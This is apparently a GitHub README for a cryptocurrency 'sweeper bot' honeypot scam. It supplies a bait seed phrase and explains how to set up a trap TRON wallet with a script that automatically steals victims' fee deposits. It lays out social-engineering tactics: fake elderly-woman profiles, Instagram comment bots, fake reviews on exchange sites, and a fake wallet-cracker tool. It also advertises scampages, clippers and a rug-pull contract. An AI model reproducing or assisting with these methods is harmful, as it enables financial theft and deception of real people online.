# Crypto-Sweeper-Bot

Greetings! Today, I'd like to share with you a valuable opportunity that has the potential to help you earn a significant amount of money. In my continuous effort to improve, I am always updating my e-books with new and effective methods. If you ever need any assistance in setting up a script that you have purchased from me or would like to purchase one, I am happy to help. you can contact me on Telegram. My username is: [@Kairo_Kinetic](https://t.me/Kairo_Kinetic)  If you need any custom scampages, visit my Telegram channel. I also bot pretty much all social media platforms so for me this script is almost completely passive income, after setup i don't have to engage with anyone, I just make sure the bots keep running and growing an audience and spreading my collection plate around LOL.

+ likes & followers on both Onlyfans & Fansly. I also have many EW tools and private packs for sale, just message me to see samples.

Ok, let's start with this! You will need to download a wallet first.

Install OKX wallet from the Chrome Webstore [HERE](https://chromewebstore.google.com/detail/okx-wallet/mcohilncbfahbmgdjkbpemcciiolgcge)  

You can install it on any device it doesn't matter, if it's on a mobile device just install it from your app store.  

Now you need to click "import wallet." They ask you to enter your recovery seed phrase, and to set a local password.
### Import this 12-word phrase:  

**alarm fetch churn bridge exercise tape speak race clerk couch crater letter**  


Congrats! Now you have a OKX wallet with $8k USDT.

## **But wait...**  
You are happy now because you get free $8k. And you will try to withdraw this money fast to your wallet. 
The first thing you need TRX to pay a fee for this transaction. But there is no TRX on this wallet. 
You are now thinking to transfer some TRX from your wallet and steal this $8k. 

### Stop and don't do this!
Because it's a trap. I call it the "scam a scammer" method. This wallet is connected with a bot script that reacts faster than a human, and when you send your TRX, the script will withdraw it faster than you to my wallet. And no matter how hard you try, you can't withdraw it. With this trap method, I earn a very healthy passive income every day, and today I will show you how to create a trap wallet like this and how to use it to earn a lot of money also.

## How to create the trap wallet?
First, you need to create a Tron wallet, get the private key and 12-word recovery phrase of this wallet.
Now we need to connect this wallet with a script.
 

## How do you get the script?
There are three main methods to get this script.

#### The first method
          is to buy it from the developer. The script's price is $200.00 https://primetools.world/product/trx-sweeper and the dev helps you set it up if you don't understand certain parts, you get full after purchase support. He also offers to host the bot for you for $25 for 6 months which is alot cheaper than renting a VPS for $10 a month! He even offers an option to set the whole thing up for you, although that option does cost a little more.
 
#### The second method
          is to get a cracked script. You can download a cracked version possibly from forums like this if you look hard enough, but i wouldn't trust those at all and I don't vouch for this method at all.   
          I'm  not responsible if you find a script that has hidden malware that changes your wallet address.  
          (I've seen it happen to people before they realize it's better to just pay for it)
 
#### The third method
          is to go to a freelancer website and ask a programmer to make one for you. It'll cost around $500+

But the best way is to buy it from the owner because he can also help you set it up if you need and doesn't charge anything extra. Unless you are proficient in JavaScript, you’re gonna want the support that comes with the first purchase option. 

## Now you need two wallets.
The first wallet will be connected to the bot script; the second wallet you use to receive the tokens that are "swept" from the first wallet. 

 Now take the first wallet PRIVATE KEY, add it to **line 9**
   const privateKey =  'scam-wallet-private-key-goes-here' ;
![imgur](https://imgur.com/vqRBfNH.png)


 Then your first wallets ADDRESS, and add it to **line 17**
  const senderAddress = 'scam-wallet-address-goes-here' ;
![imgur](https://imgur.com/kMu3EOl.png)
 

 Take the second wallet ADDRESS (not private key) and put it in **line 18**
   const recipientAddress = 'your-safe/final-wallet-address-goes-here' ;
![imgur](https://imgur.com/gwRYbCA.png)

 
Ok, so this next one lets you make sure you got the latest release of the script. So if the one you bought doesn't have these next two sections, Be very suspicious! In fact if I were you I would NOT input ANY of my wallets' keys (public or private) or just any information because the script could be sending everything to the opportunist who's impersonating me. If you're not sure about where you got your copy, feel free to message me and I'll tell you if it's authentic or not. 

Take the PRIVATE KEY of your OWNER wallet (that's the wallet used for the multi-sig) and add it to **line 32**

Get a Discord webhook from any channel you want to see notifications in every time you get a hit, add it to **line 40**
   axios.post('https://discord.com/api/webhooks/identifier') ; //replace link with your webhook

# <p align="center">⚠️ IMPORTANT ⚠️</p>  
**Just know that I've never seen an imposter script that implements multi-sig and Discord webhooks (It would make it a lot harder for them to ultimately steal all your money if they implemented multi-sig), but the scammers can still find a way to get it from you.**

**The only way you are guaranteed to get the legit script is buying it from the shop above. NOT from some jackoff on telegram who calls himself "MasterSwiper" or some shit like that. LOL**

**So what's more important to know is that my script does now implement Discord webhooks and multisig, so if someone is claiming to be selling you the Prime Sweeper Bot, but it doesn't include those, or they can't answer any questions about it, that's a huge red flag 🚩that they are a scammer and is most likely trying to sell you something with a backdoor!**  

Personally, I can give you a temporary key so you can even set it all up and see it working before you even pay. Then if you like it I give you a permanent version, if you don't I deactivate your temporary key. Simple as that, and you get a risk-free experience without the possibility of getting scammed!

If you are unable to complete these last steps, check the script guide or contact your seller/programmer. In the newest version of the sweeper, you will also have multisig support & the option to input a discord webhook so you get a notification every time you get a victim showing how much TRX was transferred and what the USD equivalent is.

Here's a video of the webhook results of an instance that hasn't even been spreading for two months:

https://github.com/TP-online/Crypto-Sweeper-Bot/assets/126422431/a8fc9360-61a8-4c7e-a273-83d6b5462ad0


FYI the reason you also see a bunch of $0.00 transactions in between the actual hits in the video is because the way the Tron network works is every time you send a token to someone else you almost instantly get these little "dividends" deposits back to your wallet which is a very very small percentage of what you just sent they end up being 0.000003 TRX which is equivalent to $0.00000036 USD or 36100000000 of a penny.
In other words it's "Thirty-six / one hundred-millionths" of a penny, and you get a few of those transactions back whenever you send some out. Each one of those is triggering the sweeper to send a webhook, but not in any amount big enough to round up to any number.

And that is my long winded explanation for why you see some $0.00 transaction notifications in between the actual hits.

Congratulations! Now you have your trap wallet, deposit in it some USDT / Tether or another token to use as the bait, and start spreading your seed phrase or private keys around!

## How to get victims to hack your wallet and put some TRX on it?

### The first method (outdated)
is to share your wallet private key on leaked forums and groups and tell them that the wallet has been hacked. Everyone will hurry up to take money from it, and you get tons of victims.
 
### The second method
is to go to social media and create a fake profile with a picture of an old woman. Send them this DM: "Hey there, I've got a wallet with 1k $USDT in it, but I don't know how to use it. Could you withdraw it for me, and we will split it in half? Here is my Secret Phrase:" (and enter the seed phrase to their wallet). I use this method on Twitter and Facebook; 99% of victims think they are smart LOL, and they're trying to steal your money because you are an old woman.

### The third method
You will need to create an Instagram profile because we will use the autopilot method to share your private key. You must use the CHROME browser, and you will install a plugin named "IG Comment Bot." This bot will automatically post comments on new images that are added on Instagram, but we won't spread this on shit posts. We will target specific hashtags like cryptocurrency-related or investment-related hashtags.

### The fourth method
Visit website reviews, something like TrustPilot and ScamAdviser.com, and go to exchange pages like Binance or Coinbase. Write negative feedback with your private key, telling them that you have $1000 and you can't withdraw it.
 
### The fifth method  
The ultimate success rate comes when you can get people to NOT receive your seed phrase from you giving it to them, or them reading it in some comments section, but when they put some amount of effort into finding it themselves. If they have to work for it or put their own effort into finding it, they inherently have much more trust in it. Not to mention if they think they're the only ones who have it! (TOO EASY = SUS ASF)
That's why the best tool for the proliferation of your seed phrase is The Fake Wallet Cracker from Prime Tools! It appears to be a brute-force wallet cracker that scans the blockchain at hyperspeed attempting to brute-force private keys, when actually you've configured it to "crack" only the wallets you want it to. Which means you get a custom delivery system that makes people think they are actually cracking the wallet themselves, thus putting their own effort into finding your seed phrase. In testing we saw over 400% increase in hits, which means 5x more people sent money to our trap wallet. You can get this tool from the same site as the Sweeper and actually get a huge discount if you buy them both together as a package deal and get free updates, and we just shipped a huge update today that makes the tool exponentially better and more customizable. All previous buyers got it for free!

**You can try many methods and create your own private method of proliferation. However you do it, you just need to share your wallet and get victims. Get creative! For a short time I will also share the methods that I currently use with whoever buys the script. If you want to know just ask me, but once I give it out to ten people or so I'm not going to continue because I do still use those methods**

Prime tools has been awesome letting me sell on their shop! It's worth noting that they also have some other very effective crypto tools, I have one of their Clippers that has treated me very well and I'm working on their "Crypto RugPull Token Contract" right now, so we'll see how that goes. I'll keep you guys updated on that.

# Work Smarter not Harder.
**If you're going to scam people, then scam the motherfuckers that are already trying to scam you!
The beauty of this method is that nobody will become a victim unless they are actively trying to steal from you in the first place.**
